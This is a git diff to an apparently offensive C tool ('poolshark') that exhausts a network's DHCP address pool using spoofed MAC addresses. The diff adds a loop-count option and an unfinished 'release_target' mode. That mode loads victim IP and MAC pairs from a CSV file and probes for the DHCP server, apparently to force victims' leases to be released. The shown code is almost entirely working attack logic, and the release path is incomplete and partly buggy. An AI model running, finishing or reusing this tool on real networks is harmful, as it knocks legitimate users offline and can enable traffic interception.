@@ -20,7 +20,11 @@
 #include <signal.h>
 
 #define BUFFER_SIZE 65535
+#define MAX_LINE_LEN 2048
+
 volatile sig_atomic_t keep_running = 1;
+//for testing
+int num_of_loops = 0;
 
 // DHCP header structure
 typedef struct DHCP
@@ -91,6 +95,13 @@ typedef struct Exausted
     struct Exausted *next;
 } Exausted;
 
+typedef struct Targets
+{
+    uint8_t ip_addr[4];
+    uint8_t mac[6];
+    struct Targets *next;
+} Targets;
+
 void print_usage(const char *progname);
 void spoof_mac(uint8_t *mac);
 void rand_transaction_id(uint8_t *id);
@@ -99,6 +110,7 @@ int netmask_to_cidr(unsigned long netmask);
 void exaust_pool(int sock, int ifindex, Packet *p, Exausted **head, int num, int delay, const char *hostname);
 void stop(int sig);
 void cleanup(Packet *p, Exausted *head, int sock);
+void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex);
 
 int main(int argc, char *argv[])
 {
@@ -110,6 +122,7 @@ int main(int argc, char *argv[])
     FILE *fp = NULL;
     Exausted *head = NULL;
     const char *hostname = "pwn3d-poolshark";
+    int mode = 0;
 
     if(getuid() != 0)
     {
@@ -118,7 +131,7 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    while((opt = getopt(argc, argv, "i:d:f:n:h")) != -1)
+    while((opt = getopt(argc, argv, "i:d:f:n:l:h")) != -1)
     {
         switch (opt)
         {
@@ -137,6 +150,9 @@ int main(int argc, char *argv[])
             case 'n':
                 hostname = optarg;
                 break;
+            case 'l':
+                num_of_loops = atoi(optarg);
+                break;
         }
     }
 
@@ -154,6 +170,7 @@ int main(int argc, char *argv[])
             perror("fopen");
             return 1;
         }
+        mode = 1;
     }
 
     Packet *p = malloc(sizeof(Packet));
@@ -229,9 +246,7 @@ int main(int argc, char *argv[])
     p->dhcp.options[3] = 255;
     memset(&p->dhcp.options[4], 0x00, 308);
     calc_ip_checksum(p);
-
     
-
     struct sockaddr_in *iaddr = (struct sockaddr_in *)&ifr.ifr_netmask;
     memcpy(ifr.ifr_name, iface, sizeof(iface));
 
@@ -251,7 +266,27 @@ int main(int argc, char *argv[])
 
     int cidr = netmask_to_cidr(iaddr->sin_addr.s_addr);
     int num_of_ips = (1 << (32 - cidr)) - 2;
+
+    if(ioctl(sock, SIOCGIFADDR, &ifr) < 0)
+    {
+        perror("ioctl");
+        return 1;
+    }
+
+    iaddr = (struct sockaddr_in *)&ifr.ifr_addr;
+    uint8_t iface_ip[4];
+    memcpy(iface_ip, &iaddr->sin_addr.s_addr, 4);
+
+    if(mode)
+    {
+        release_target(fp, p, sock, *iface_ip, ifindex);
+        return 0;
+    }
  
+    if(!num_of_loops)
+    {
+        num_of_loops = num_of_ips;
+    }
     exaust_pool(sock, ifindex, p, &head, num_of_ips, 0, hostname);
     cleanup(p, head, sock);
 }
@@ -322,7 +357,7 @@ void exaust_pool(int sock, int ifindex, Packet *p, Exausted **head, int num, int
     int count = 0;
     bool success = false;
 
-    for(int i = 0; i < num && keep_running; i++)
+    for(int i = 0; i < num_of_loops && keep_running; i++)
     {
         spoof_mac(p->eth.src_mac);
         memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
@@ -520,4 +555,163 @@ void cleanup(Packet *p, Exausted *head, int sock)
 void stop(int sig)
 {
     keep_running = 0;
+}
+
+void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex)
+{
+    char buffer[MAX_LINE_LEN];
+    char *token;
+    Targets *head = NULL;
+    int row_count = 0;
+    char data[BUFFER_SIZE];
+
+    while(fgets(buffer, MAX_LINE_LEN, fp) != NULL)
+    {
+        Targets *new_node = malloc(sizeof(Targets));
+        if(!new_node)
+        {
+            perror("malloc");
+            return;
+        }
+
+        new_node->next = head;
+
+        token = strtok(buffer, ",");
+        int col = 0;
+
+        while(token != NULL)
+        {
+            switch(col)
+            {
+                case 0:
+                    inet_pton(AF_INET, token, new_node->ip_addr);
+                    break;
+                case 1:
+                    int a, b, c, d, e, f;
+                    if(sscanf(token, "%x:%x:%x:%x:%x:%x", &a, &b, &c, &d, &e, &f) == 6)
+                    {
+                        new_node->mac[0] = (uint8_t)a;
+                        new_node->mac[1] = (uint8_t)b;
+                        new_node->mac[2] = (uint8_t)c;
+                        new_node->mac[3] = (uint8_t)d;
+                        new_node->mac[4] = (uint8_t)e;
+                        new_node->mac[5] = (uint8_t)f;
+                    }
+                    else
+                    {
+                        printf("Error parsing Cardshark import\n");
+                        free(new_node);
+                        return;
+                    }
+                    break;
+            }
+            col++;
+            token = strtok(NULL, ",");
+            
+        }
+        head = new_node;
+        row_count++;
+    }
+    fclose(fp);
+
+    printf("Loaded %d IP(s) from file\n", row_count);
+
+    Targets *current = head;
+
+    while(current != NULL)
+    {
+        Targets *tmp = current;
+        char ip_str[INET_ADDRSTRLEN];
+        char mac_str[18];
+        inet_ntop(AF_INET, current->ip_addr, ip_str, INET_ADDRSTRLEN);
+        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X", 
+        current->mac[0],
+        current->mac[1],
+        current->mac[2],
+        current->mac[3],
+        current->mac[4],
+        current->mac[5]
+        );
+        printf("%s with mac %s\n", ip_str, mac_str);
+        current = current->next;
+        free(tmp);
+    }
+
+
+    // clear dhcp options
+    memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
+    int offset = 0;
+    // set for DHCPDISCOVER
+    p->dhcp.options[offset++] = 53;
+    p->dhcp.options[offset++] = 1;
+    p->dhcp.options[offset++] = 1;
+    p->dhcp.options[offset++] = 255;
+    
+    struct sockaddr_ll addr = {0};
+    socklen_t addr_len = sizeof(addr);
+    addr.sll_family = AF_PACKET;
+    addr.sll_ifindex = ifindex;
+    addr.sll_halen = 6;
+    memset(addr.sll_addr, 0xff, 6);
+
+    printf("Sending DHCPDISCOVER to discover DHCP host\n");
+    int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&addr, sizeof(addr));
+
+    if(bytes_sent < 0)
+    {
+        perror("sendto");
+        return;
+    }
+
+    while(keep_running)
+    {
+        int bytes_received = recvfrom(sock, data, BUFFER_SIZE, 0, (struct sockaddr *)&addr, &addr_len);
+
+        if(bytes_received < 0)
+        {
+            perror("recvfrom");
+            return;
+        }
+
+        Packet *r = (struct Packet *)data;
+
+        if(r->dhcp.opcode != 0x02)
+        {
+            continue;
+        }
+
+        if(memcmp(r->dhcp.transaction_id, p->dhcp.transaction_id, sizeof(p->dhcp.transaction_id)) != 0)
+        {
+            continue;
+        }
+
+        uint8_t dhcp_host[4];
+        char dhcp_str[INET_ADDRSTRLEN];
+
+        int len = sizeof(r->dhcp.options);
+        int i = 0;
+
+        while(i < len)
+        {
+            if(r->dhcp.options[i] == 255)
+            {
+                break;
+            }
+
+            if(r->dhcp.options[i] == 54)
+            {
+                memcpy(dhcp_host, &r->dhcp.options[i+2], 4);
+                inet_ntop(AF_INET, dhcp_host, dhcp_str, INET_ADDRSTRLEN);
+                printf("%s\n", dhcp_str);
+                break;
+            }
+
+            i += 2 + r->dhcp.options[i+1];
+        }
+
+
+        break;
+    }
+
+
 }
